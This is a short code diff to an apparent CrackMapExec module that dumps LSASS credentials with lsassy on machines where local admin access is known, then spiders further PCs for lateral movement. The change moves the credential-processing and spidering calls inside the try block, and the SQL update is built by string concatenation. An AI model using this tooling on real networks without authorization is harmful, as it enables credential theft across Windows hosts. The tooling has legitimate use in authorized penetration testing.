@@ -193,10 +193,11 @@ class CMEModule:
                         try:
                             self.run_lsassy(context, connection)
                             cursor.execute("UPDATE pc_and_admins SET dumped = 'TRUE' WHERE pc_name LIKE '" + pc[0] + "%'")
+
+                            process_creds(context, connection, credentials_data, dbconnection, cursor, driver)
+                            self.spider_pcs(context, connection, cursor, dbconnection, driver)
                         except Exception:
                             context.log.error(f"Failed to dump lsassy on {pc[0]}")
-                        process_creds(context, connection, credentials_data, dbconnection, cursor, driver)
-                        self.spider_pcs(context, connection, cursor, dbconnection, driver)
         if len(admin_access) > 0:
             context.log.error("No more local admin access known. Please try re-running Bloodhound with newly found accounts.")
             exit()
